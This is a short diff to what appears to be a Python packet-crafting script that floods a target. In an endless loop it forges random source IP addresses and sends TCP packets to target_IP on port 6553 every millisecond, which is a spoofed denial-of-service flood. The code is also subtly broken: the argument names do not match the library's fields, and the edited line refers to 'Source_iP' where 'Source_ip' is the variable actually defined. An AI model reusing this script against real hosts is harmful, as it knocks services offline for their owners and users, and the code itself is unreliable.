@@ -12,7 +12,7 @@ while True:
    dot = '.'
 
    Source_ip = a + dot + b + dot + c + dot + d
-   IP1 = IP(source_IP = source_IP, destination = target_IP)
+   IP1 = IP(source_IP = Source_iP, destination = target_IP)
    TCP1 = TCP(srcport = source_port, dstport = 6553)
    pkt = IP1 / TCP1
    send(pkt,inter = .001)
